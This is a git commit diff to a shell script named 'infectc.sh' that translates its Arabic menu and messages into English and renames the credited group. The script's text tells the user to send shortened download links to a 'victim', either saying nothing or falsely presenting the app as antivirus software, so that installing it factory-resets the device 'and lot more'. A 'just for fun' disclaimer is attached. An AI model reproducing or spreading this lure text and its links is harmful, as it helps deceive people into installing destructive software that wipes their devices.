fb732df1417e723b25c498dccbf058be1c80a385
omarproxt <102703203+omarproxt@users.noreply.github.com>
2023-01-09 17:33:24 +0200

    Update infectc.sh

--- infectc.sh
+++ infectc.sh
@@ -36,7 +36,7 @@ echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
 '
 echo " " 
 echo -e "$red                       ▶Coded by$grn NITRO$red◀$rset"
-echo -e "$red                      ⫸$ylo  Noob Hackers$red ⫷$rset"
+echo -e "$red                      ⫸$ylo  Team prox-t$red ⫷$rset"
 echo 
 # Functions
 echo -e "$red                    [Infect them with fun]$rset"
@@ -68,7 +68,7 @@ echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
 '
 echo " " 
 echo -e "$red                       ▶Coded by$grn NITRO$red◀$rset"
-echo -e "$red                      ⫸$ylo  Noob Hackers$red ⫷$rset"
+echo -e "$red                      ⫸$ylo  Team prox-t$red ⫷$rset"
 echo 
 # Functions
 echo -e "$red                    [Infect them with fun]$rset"
@@ -79,14 +79,14 @@ menu(){
 echo -e "$grn             ＞＞＞＞>>>＞$ylo [Options]$grn ＜<<<＜＜＜＜$rset"
 echo " "
 echo " "
-echo -e "$red                        ➡$cyan [\e[92m1\e[96m] تصيب الآن"
-echo -e "$red                        ➡$cyan [\e[92m2\e[96m] احفظ الان"
-echo -e "$red                        ➡$cyan [\e[92m3\e[96m] عن"
-echo -e "$red                        ➡$cyan [\e[92m4\e[96m] تحديث السكربت "
-echo -e "$red                        ➡$cyan [\e[92m5\e[96m] الإشتراك"
-echo -e "$red                        ➡$cyan [\e[92m6\e[96m] أكثر"
-echo -e "$red                        ➡$cyan [\e[92m7\e[96m] دردشة"
-echo -e "$red                        ➡$cyan [\e[92m8\e[96m] مخرج"
+echo -e "$red                        ➡$cyan [\e[92m1\e[96m] Infect now"
+echo -e "$red                        ➡$cyan [\e[92m2\e[96m] Save now"
+echo -e "$red                        ➡$cyan [\e[92m3\e[96m] About"
+echo -e "$red                        ➡$cyan [\e[92m4\e[96m] Update script "
+echo -e "$red                        ➡$cyan [\e[92m5\e[96m] Subscribe"
+echo -e "$red                        ➡$cyan [\e[92m6\e[96m] More"
+echo -e "$red                        ➡$cyan [\e[92m7\e[96m] Chat"
+echo -e "$red                        ➡$cyan [\e[92m8\e[96m] Exit"
 echo " "
 echo " "
 echo -e "$grn               >＞＞＞＞＞$ylo [SELECT]$grn ＜＜＜＜＜<$rset"
@@ -138,17 +138,17 @@ echo -e '\e[92m
                     )  (  )(_)(   )(   )__) 
                    (_)\_)(_____) (__) (____) '
 echo " "
-echo -e "\e[91m 😈  انسخ الرابط أدناه وأرسله إلى ضحيتك و
-لا تقل له شيئا. عندما يقوم بتثبيته في ملفه
-الجهاز سيتم إعادة ضبط المصنع وسيحدث الكثير.
+echo -e "\e[91m Copy below link and send it your victim and 
+say nothing to him. when he install it in his 
+device it will be factory reset and lot more happens.
                                 👇👇👇
 
          \e[92mL1NK :- \e[96mhttps://tinyurl.com/uppdatesnew\e[91m
 
                                  👆👆👆
-استخدم فقط لغرض المتعة وليس لإيذاء شخص ما.
-وقناتنا ليست مسؤولة عن أي نوع من الخسارة
-أنت تفعل للآخرين من خلال هذا البرنامج النصي."
+Use only for fun purpose not for harming someone 😇✌️.
+And our channel is not responsible for any kind of loss 
+you do to other's by this script."
 echo
 echo -ne "\e[92m#Type exit : "
 read exitz
@@ -171,17 +171,17 @@ echo -e '\e[92m
                    (_)\_)(_____) (__) (____) '
 echo " "
 echo " "
-echo -e "\e[93m  انسخ الرابط أدناه وأرسله إلى ضحيتك وأخبره
-أنه يجب عليه تثبيت هذا التطبيق أو غير ذلك
-لن يتم استرداد الجهاز. (مكافحة الفيروسات)
+echo -e "\e[93m  Copy below link and send it your victim and tell him
+that he should install this application or else his 
+device will not be recovered.(Antivirus).
                     👇👇👇
 
         \e[92mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m
 
                     👆👆👆
-استخدم فقط لغرض المتعة وليس لإيذاء شخص ما.
-وقناتنا ليست مسؤولة عن أي نوع من الخسارة
-أنت تفعل للآخرين من خلال هذا البرنامج النصي."
+Use only for fun purpose not for harming someone 😇✌️. 
+And our channel is not responsible for any kind of 
+loss you do to other's by this script.""
 echo
 echo -ne "\e[92m#Type exit : "
 read exitz
